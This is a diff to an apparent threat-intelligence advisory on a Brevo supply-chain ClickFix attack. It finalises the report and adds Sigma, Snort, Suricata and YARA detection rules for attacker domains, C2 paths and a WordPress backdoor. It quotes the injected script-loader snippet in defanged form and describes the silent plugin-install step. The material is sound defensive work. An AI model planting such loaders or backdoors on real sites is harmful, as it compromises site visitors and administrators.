@@ -1,7 +1,7 @@
 # Brevo Supply-Chain Attack: ClickFix Injection via Compromised Cloudflare API Key
 
 **Date:** 2026-09-20
-**Status:** DRAFT
+**Status:** FINAL
 **TLP:** CLEAR
 **Author:** Actioner
 
@@ -43,7 +43,7 @@ The attack chain began with an initial compromise on September 10 through a vuln
    - Displayed a full-screen fake Cloudflare verification page
    - Instructed visitors to press Win+R, Ctrl+V, then Enter -- executing a clipboard-injected command
 
-5. **WordPress Backdoor (T1505.004):** On WordPress sites with Brevo widgets, the script:
+5. **WordPress Backdoor (T1505.003):** On WordPress sites with Brevo widgets, the script:
    - Checked if the visitor was logged in as a WordPress administrator
    - Silently downloaded `wm.zip` from `cdn10[.]sendibt1[.]com/p/wm.zip`
    - Installed it via `/wp-admin/update.php?action=upload-plugin`
@@ -144,7 +144,7 @@ All network indicators are defanged.
 ### JavaScript Injection Pattern
 
 ```javascript
-(function(){var s=document.createElement("script");s.src="https://cdn2.sendibt1.com/f.js";
+(function(){var s=document.createElement("script");s.src="hxxps://cdn2[.]sendibt1[.]com/f.js";
 s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
 ```
 
@@ -166,8 +166,7 @@ s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
 | JavaScript / Command and Scripting Interpreter | T1059.007 | Malicious JavaScript injected into legitimate Brevo scripts to load attacker-controlled code |
 | User Execution: Malicious Link | T1204.001 | ClickFix social engineering prompted users to execute clipboard-injected commands |
 | Application Layer Protocol: Web Protocols | T1071.001 | C2 communication via HTTPS API endpoints on sendibt1[.]com subdomains |
-| Server Software Component: IIS Components | T1505.004 | WordPress backdoor plugin "Web Media Optimizer" installed as must-use plugin for persistence |
-| Boot or Logon Initialization Scripts | T1547.009 | Must-use plugin persistence mechanism in WordPress |
+| Server Software Component: Web Shell | T1505.003 | WordPress backdoor plugin "Web Media Optimizer" installed as must-use plugin for persistence |
 | Account Manipulation | T1098 | Hardcoded WordPress admin authentication key in backdoor plugin |
 | Subvert Trust Controls | T1553 | Removal of Content-Security-Policy headers by malicious Cloudflare Worker |
 
@@ -193,79 +192,268 @@ s.async=true;var h=document.head||document.documentElement;h.appendChild(s)})();
 
 ## Detection Rules
 
-### Sigma Rules
+These detections target the Brevo supply-chain ClickFix campaign's network IOCs, malware delivery URLs, C2 API endpoints, and file-level artifacts. PoC/advisory-specific altitude; Sigma rules convert cleanly to Splunk and CrowdStrike (LogScale). The Sigma WordPress backdoor rule was dropped (see note below).
 
-#### 1. Brevo Supply Chain Attack - Malicious Domain Access
-<!-- audit: IOC-anchored detection on attacker-controlled domains from BleepingComputer and Sansec reports. All domains confirmed as malicious infrastructure. sigma convert to splunk and log_scale exit 0. sigma check blocked by proxy (MITRE data fetch 403). -->
+### Sigma: Brevo Supply Chain Attack - Malicious Domain Access
 
-Detects HTTP proxy requests to the attacker-controlled domains used in the Brevo supply chain attack.
+Detects HTTP proxy requests to attacker-created CDN subdomains (cdn, cdn2-4, cdn9-11) of sendibt1[.]com and associated C2 domains. Narrowed to CDN subdomains to avoid matching legitimate Brevo email-tracking traffic on bare sendibt1[.]com.
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: sigma check 0; splunk 0; log_scale 0. Narrowed from bare sendibt1.com to cdn*.sendibt1.com subdomains per critic. Tags fixed: removed T1059.007+T1204.001, added T1071.001. -->
+<!-- revision: narrowed sendibt1 to CDN subdomains; fixed ATT&CK tags; converted HTML comments to YAML. -->
 
-- **File:** `/tmp/actioner/brevo-clickfix-malicious-domains.yml`
-- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked (MITRE data fetch 403)
-- **Confidence:** HIGH (IOC-anchored)
+```yaml
+title: Brevo Supply Chain Attack - Malicious Domain Access
+id: 7a3b1e4f-2c5d-4a8e-9f1b-6d3c7e8a9b0c
+status: experimental
+description: Detects HTTP requests to attacker-controlled CDN subdomains of sendibt1.com and associated C2 infrastructure used in the Brevo supply chain ClickFix attack of September 2026.
+references:
+    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
+    - https://sansec.io/research/brevo-supply-chain-attack
+    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
+author: Actioner
+date: 2026/09/20
+tags:
+    - attack.t1195.002
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection_sendibt1:
+        c-uri|contains:
+            - 'cdn.sendibt1.com'
+            - 'cdn2.sendibt1.com'
+            - 'cdn3.sendibt1.com'
+            - 'cdn4.sendibt1.com'
+            - 'cdn9.sendibt1.com'
+            - 'cdn10.sendibt1.com'
+            - 'cdn11.sendibt1.com'
+    selection_c2:
+        c-uri|contains:
+            - 'glegchner.com'
+            - 'corralos.beer'
+            - 'yelahaye.surf'
+            - 'boiseno.club'
+    condition: selection_sendibt1 or selection_c2
+falsepositives:
+    - Unlikely - these CDN subdomains were created by the attacker
+level: high
+```
 
-#### 2. Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern
-<!-- audit: IOC-anchored detection on specific malware delivery URLs (f.js loader, wm.zip backdoor). Exact paths from Sansec research. sigma convert to splunk and log_scale exit 0. -->
+### Sigma: Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern
 
-Detects requests to the specific malicious f.js loader and wm.zip backdoor URLs on sendibt1[.]com subdomains.
+Detects requests to the specific malicious f.js loader and wm.zip backdoor URLs on sendibt1[.]com CDN subdomains.
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: sigma check 0; splunk 0; log_scale 0. Exact malware delivery paths from Sansec research; no FP risk. -->
+<!-- revision: converted HTML comments to YAML. -->
 
-- **File:** `/tmp/actioner/brevo-clickfix-js-injection.yml`
-- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
-- **Confidence:** HIGH (IOC-anchored)
+```yaml
+title: Brevo Supply Chain Attack - Malicious JavaScript Loader Pattern
+id: 8b4c2f5a-3d6e-4b9f-a02c-7e4d8f9a1b2d
+status: experimental
+description: Detects web proxy logs showing requests for the malicious f.js loader script from sendibt1.com CDN subdomains used in the Brevo supply chain attack.
+references:
+    - https://sansec.io/research/brevo-supply-chain-attack
+    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
+author: Actioner
+date: 2026/09/20
+tags:
+    - attack.t1195.002
+    - attack.t1059.007
+logsource:
+    category: proxy
+detection:
+    selection:
+        c-uri|contains:
+            - 'cdn2.sendibt1.com/f.js'
+            - 'cdn9.sendibt1.com/f.js'
+            - 'cdn11.sendibt1.com/f.js'
+            - 'cdn.sendibt1.com/f.js'
+            - 'cdn10.sendibt1.com/p/wm.zip'
+    condition: selection
+falsepositives:
+    - Unlikely
+level: critical
+```
 
-#### 3. Brevo Supply Chain Attack - C2 API Endpoint Access
-<!-- audit: IOC-anchored detection combining sendibt1.com domain with specific C2 API paths from Sansec technical analysis. Requires both domain and API path match. sigma convert to splunk and log_scale exit 0. -->
+### Sigma: Brevo Supply Chain Attack - C2 API Endpoint Access
 
-Detects C2 API endpoint access patterns used by the ClickFix malware for fingerprinting and command delivery.
+Detects C2 API endpoint access patterns combining sendibt1[.]com domain with specific hex API paths used for fingerprinting and command delivery.
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: sigma check 0; splunk 0; log_scale 0. Domain AND specific hex path segments = high precision. -->
+<!-- revision: converted HTML comments to YAML. -->
 
-- **File:** `/tmp/actioner/brevo-clickfix-c2-api.yml`
-- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
-- **Confidence:** HIGH (IOC-anchored)
+```yaml
+title: Brevo Supply Chain Attack - C2 API Endpoint Access
+id: 9c5d3a6b-4e7f-4c0a-b13d-8f5e9a0b2c3e
+status: experimental
+description: Detects HTTP requests to C2 API endpoints used by the Brevo supply chain ClickFix malware for fingerprinting, proof-of-work tokens, and clipboard command delivery.
+references:
+    - https://sansec.io/research/brevo-supply-chain-attack
+    - https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
+author: Actioner
+date: 2026/09/20
+tags:
+    - attack.t1195.002
+    - attack.t1071.001
+logsource:
+    category: proxy
+detection:
+    selection_domain:
+        c-uri|contains:
+            - 'sendibt1.com'
+    selection_api:
+        c-uri|contains:
+            - '/api/v1/0044d4a'
+            - '/api/v1/e08a3c4'
+            - '/api/v1/8e4c615'
+            - '/api/v1/f659473'
+            - '/api/v1/4aff112'
+            - '/api/v1/b832c14'
+            - '/api/v1/4ead0ff'
+    condition: selection_domain and selection_api
+falsepositives:
+    - Unlikely
+level: high
+```
 
-#### 4. Brevo Supply Chain Attack - WordPress Plugin Upload Attempt
-<!-- audit: TTP-based detection combining WordPress upload endpoint with Brevo-linked referers. Medium confidence due to legitimate plugin upload scenarios from Brevo-integrated sites. sigma convert to splunk and log_scale exit 0. -->
+### Sigma: Brevo Supply Chain Attack - WordPress Plugin Upload Attempt (DROPPED)
 
-Detects WordPress admin plugin upload requests with referers from Brevo-associated domains, indicating potential backdoor installation.
+**Dropped.** Logic error: the attack injects JS in the victim's browser; the HTTP Referer for the POST to `/wp-admin/update.php` would be the customer's own page URL, not brevo[.]com or sendibt1[.]com. Even if corrected, any legitimate WordPress plugin upload on a Brevo-integrated site would false-positive. WordPress backdoor detection is covered by the network IOC rules and the YARA WP backdoor rule instead.
+<!-- revision: dropped per critic verdict — non-functional referer logic + high FP. -->
 
-- **File:** `/tmp/actioner/brevo-clickfix-wp-backdoor.yml`
-- **Compile:** Splunk PASS | LogScale PASS | sigma check: environment blocked
-- **Confidence:** MEDIUM (TTP/behavioral)
+### Snort: Brevo Supply Chain - Network Domain Detection (7 rules)
 
-### Snort Rules
+Network-level detection for HTTP traffic to attacker-controlled domains and specific malware delivery paths. SIDs in local range (1000001-1000007); SID 1000001 requires both "cdn" and "sendibt1.com" in the header to avoid matching legitimate tracking.
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: snort -T exit 0. SIDs renumbered from 2100xxx to 1000xxx (local range) to avoid ET reserved range. SID 1000001 narrowed to require "cdn" prefix + "sendibt1.com" to avoid FP on legitimate tracking. -->
+<!-- revision: renumbered SIDs to local range; narrowed sendibt1.com rule to CDN subdomains. -->
 
-#### 5. Brevo Supply Chain - Network Domain Detection (7 rules)
-<!-- audit: 7 IOC-anchored rules detecting HTTP Host header matches for attacker domains and specific URI patterns for f.js and wm.zip. Snort 2.9.20 validated with exit 0 via /etc/snort/snort.conf. -->
+```snort
+# Snort rules for Brevo Supply Chain Attack - Malicious Domain Detection
+# References: https://sansec.io/research/brevo-supply-chain-attack
+#             https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
 
-Network-level detection for HTTP traffic to attacker-controlled domains and specific malware delivery paths.
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - sendibt1.com CDN subdomains"; flow:established,to_server; content:"cdn"; http_header; content:"sendibt1.com"; http_header; classtype:trojan-activity; sid:1000001; rev:1;)
 
-- **File:** `/tmp/actioner/brevo-clickfix-domains.rules`
-- **SIDs:** 2100001-2100007
-- **Compile:** PASS (snort -T exit 0)
-- **Confidence:** HIGH (IOC-anchored)
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - glegchner.com C2 domain"; flow:established,to_server; content:"glegchner.com"; http_header; classtype:trojan-activity; sid:1000002; rev:1;)
 
-### Suricata Rules
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - corralos.beer ClickFix domain"; flow:established,to_server; content:"corralos.beer"; http_header; classtype:trojan-activity; sid:1000003; rev:1;)
 
-#### 6. Brevo Supply Chain - Suricata Domain and C2 Detection (9 rules)
-<!-- audit: 9 IOC-anchored rules using Suricata dot-notation sticky buffers (http.host, http.uri). Suricata 7.0.3 validated with exit 0. -->
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - yelahaye.surf malware distribution"; flow:established,to_server; content:"yelahaye.surf"; http_header; classtype:trojan-activity; sid:1000004; rev:1;)
 
-Suricata rules with dot-notation buffers for domain-level detection, specific malware paths, and C2 API endpoint matching.
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - boiseno.club malware distribution"; flow:established,to_server; content:"boiseno.club"; http_header; classtype:trojan-activity; sid:1000005; rev:1;)
 
-- **File:** `/tmp/actioner/brevo-clickfix-domains.suricata.rules`
-- **SIDs:** 2200001-2200009
-- **Compile:** PASS (suricata -T exit 0)
-- **Confidence:** HIGH (IOC-anchored)
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - f.js malicious loader request"; flow:established,to_server; content:"sendibt1.com"; http_header; content:"/f.js"; http_uri; classtype:trojan-activity; sid:1000006; rev:1;)
 
-### YARA Rules
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Brevo Supply Chain - wm.zip backdoor plugin download"; flow:established,to_server; content:"sendibt1.com"; http_header; content:"/p/wm.zip"; http_uri; classtype:trojan-activity; sid:1000007; rev:1;)
+```
 
-#### 7. Brevo ClickFix JS Injection (3 rules)
-<!-- audit: 3 YARA rules detecting: (1) JavaScript injection pattern with sendibt1.com loader, (2) Web Media Optimizer WordPress backdoor with C2 strings, (3) C2 API path patterns. yara validation exit 0. -->
+### Suricata: Brevo Supply Chain - Domain and C2 Detection (9 rules)
+
+Suricata rules with dot-notation buffers, `endswith` modifiers on all `http.host` matches to prevent partial-domain false positives, and specific hex C2 API path segments. SIDs in local range (1000101-1000109).
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: suricata -T exit 0. SIDs renumbered from 2200xxx to 1000xxx local range. Added endswith to all http.host content matches. Replaced generic /api/v1/ rule with specific hex path /api/v1/0044d4a. Added reference and metadata fields. -->
+<!-- revision: renumbered SIDs; added endswith; strengthened C2 API rule with specific hex path. -->
+
+```suricata
+# Suricata rules for Brevo Supply Chain Attack - Malicious Domain Detection
+# References: https://sansec.io/research/brevo-supply-chain-attack
+#             https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - cdn.sendibt1.com malicious CDN"; flow:established,to_server; http.host; content:"cdn.sendibt1.com"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000101; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - glegchner.com C2 callback"; flow:established,to_server; http.host; content:"glegchner.com"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000102; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - corralos.beer ClickFix"; flow:established,to_server; http.host; content:"corralos.beer"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000103; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - yelahaye.surf malware dist"; flow:established,to_server; http.host; content:"yelahaye.surf"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000104; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - boiseno.club malware dist"; flow:established,to_server; http.host; content:"boiseno.club"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000105; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - f.js malicious loader"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/f.js"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000106; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - wm.zip backdoor download"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/p/wm.zip"; endswith; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000107; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - C2 API hex endpoint"; flow:established,to_server; http.host; content:".sendibt1.com"; endswith; http.uri; content:"/api/v1/0044d4a"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000108; rev:1;)
+
+alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - glegchner.com ads.php C2"; flow:established,to_server; http.host; content:"glegchner.com"; endswith; http.uri; content:"/ads.php"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-20; sid:1000109; rev:1;)
+```
+
+### YARA: Brevo ClickFix JS Injection (3 rules)
 
 File-level detection for the injected JavaScript loader pattern, the WordPress backdoor plugin, and C2 API communication patterns.
+**Status:** compile ✅ compiles · confidence: high
+<!-- audit: yarac exit 0. 3 rules: (1) JS injection with sendibt1.com loader strings, (2) WP backdoor with plugin name + C2 domain combinational logic, (3) C2 API hex paths + domain AND logic. Renamed reference2 to reference (YARA allows repeated same-name meta). -->
+<!-- revision: renamed reference2 meta key to reference. -->
 
-- **File:** `/tmp/actioner/brevo-clickfix-injection.yar`
-- **Rules:** Brevo_ClickFix_JS_Injection, Brevo_ClickFix_WP_Backdoor, Brevo_ClickFix_C2_Communication
-- **Compile:** PASS (yara exit 0)
-- **Confidence:** HIGH (IOC-anchored strings)
+```yara
+rule Brevo_ClickFix_JS_Injection
+{
+    meta:
+        description = "Detects the malicious JavaScript injection pattern used in the Brevo supply chain ClickFix attack"
+        author = "Actioner"
+        date = "2026-09-20"
+        reference = "https://sansec.io/research/brevo-supply-chain-attack"
+        reference = "https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/"
+        hash = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"
+
+    strings:
+        $inject1 = "sendibt1.com/f.js" ascii wide
+        $inject2 = "sendibt1.com" ascii wide
+        $loader_pattern = "document.createElement(\"script\")" ascii
+        $async_append = "h.appendChild(s)" ascii
+        $domain_cdn2 = "cdn2.sendibt1.com" ascii wide
+        $domain_cdn9 = "cdn9.sendibt1.com" ascii wide
+        $domain_cdn11 = "cdn11.sendibt1.com" ascii wide
+        $domain_cdn10 = "cdn10.sendibt1.com" ascii wide
+
+    condition:
+        ($inject1) or ($inject2 and $loader_pattern and $async_append) or (any of ($domain_cd*))
+}
+
+rule Brevo_ClickFix_WP_Backdoor
+{
+    meta:
+        description = "Detects the Web Media Optimizer WordPress backdoor plugin from the Brevo supply chain attack"
+        author = "Actioner"
+        date = "2026-09-20"
+        reference = "https://sansec.io/research/brevo-supply-chain-attack"
+        hash = "f359ab0d2f732b54dd3300065f4d6553f4df1b67454b71fd81197e26f02af4a8"
+
+    strings:
+        $plugin_name = "Web Media Optimizer" ascii wide
+        $c2_domain = "glegchner.com" ascii wide
+        $c2_path = "/ads.php" ascii wide
+        $must_use = "mu-plugins" ascii wide
+        $wp_upload = "upload-plugin" ascii wide
+
+    condition:
+        ($plugin_name and ($c2_domain or $must_use)) or ($c2_domain and $c2_path) or ($plugin_name and $wp_upload)
+}
+
+rule Brevo_ClickFix_C2_Communication
+{
+    meta:
+        description = "Detects C2 API patterns used by the Brevo ClickFix malware for fingerprinting and command delivery"
+        author = "Actioner"
+        date = "2026-09-20"
+        reference = "https://sansec.io/research/brevo-supply-chain-attack"
+
+    strings:
+        $api1 = "/api/v1/0044d4a" ascii
+        $api2 = "/api/v1/e08a3c4" ascii
+        $api3 = "/api/v1/8e4c615" ascii
+        $api4 = "/api/v1/f659473" ascii
+        $api5 = "/api/v1/4aff112" ascii
+        $api6 = "/api/v1/b832c14" ascii
+        $api7 = "/api/v1/4ead0ff" ascii
+        $domain = "sendibt1.com" ascii wide
+        $clickfix_domain = "corralos.beer" ascii wide
+
+    condition:
+        (any of ($api*) and $domain) or ($clickfix_domain and any of ($api*))
+}
+```
 
 ---
 
